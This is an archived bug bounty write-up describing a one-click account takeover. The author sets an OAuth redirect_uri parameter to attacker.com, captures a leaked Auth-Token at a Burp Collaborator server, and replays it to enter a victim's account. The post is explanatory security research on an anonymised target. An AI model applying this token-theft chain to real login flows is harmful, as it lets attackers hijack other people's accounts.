# Unveiling the One-Click Account Takeover

- **Source URL:** https://medium.com/@hmuhamm3d/unveiling-the-one-click-account-takeover-it-started-with-an-innocent-open-redirect-9f4942ddf03f?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240603064448/https://medium.com/@hmuhamm3d/unveiling-the-one-click-account-takeover-it-started-with-an-innocent-open-redirect-9f4942ddf03f
- **Fetched:** 2026-11-24
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5636 (id 5636)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# **Unveiling the One-Click Account Takeover: It Started with an Innocent Open Redirect**

Greetings psycho security voyagers! Today, we embark on a riveting journey into the labyrinth of vulnerabilities, where every little action tells a story of triumph or, in our case, potential catastrophe. Join me as we unravel the mystique behind the One-Click Account Takeover (ATO) via Open Redirect.

**NOTE:** *Again I’m not writing this for beginners so I’ll just hit the details directly.*

# **Act I: Stage of Doubt**

First thing i did, I proceeded to the sign-up page and created an account. Upon attempting to log in, I observed a **'redirect\_uri'** parameter within the URL:

https://example.com/authorize?client\_type=loginCloud&view\_type=web&redirect\_uri=https:%2F%2Fexmaple.com%2Fsystems&client\_id=cloud\_portal&response\_type=code&grant\_type=password


**I decided to alter:**

redirect\_uri=https:%2F%2Fexmaple.com


**To:**

redirect\_uri=https:%2F%2Fattacker.com


Following my login, I found myself redirected to attacker.com, indicating a typical open redirect. I made a note of this for later.

# **Act II: The Machinations Unveiled**

Several days later, during a conversation with a friend, who happens to be an awesome hacker, I mentioned the open redirect, he said, "Have you attempted an account takeover?" Intrigued, I revisited the process and discovered that the website was disclosing the Auth-Token within the URL post-login!

Armed with this knowledge, I utilized Burp Suite to obtain a collaborator link, which I injected into the open redirect. Subsequently, I awaited the server to transmit the token to my collaborator server, and indeed, it functioned seamlessly. Now, it was time for the Proof of Concept phase.

I crafted the URL intended to log me into the victim's account, structured as follows:

https://exmaple.com/systems?code=Auth-Token


Regrettably, no discernible action occurred. Nevertheless, we did not embark on this journey to concede defeat, did we?

# **Final Act: A Call for Help**

Returning to my buddy [Abdelrhman Amin](https://medium.com/u/480eabc6545e?source=post_page-----9f4942ddf03f--------------------------------), he astutely removed the word "systems" from the URL to be:

https://example.com/account?code=Auth-Token


*Voilà, IT WORKED!*

Shout-Out to my buddy [Abdelrhman Amin](https://medium.com/u/480eabc6545e?source=post_page-----9f4942ddf03f--------------------------------) , and remember always to Collab with your friends to get more ideas because you can always miss something and of course don’t give up on a vulnerability.
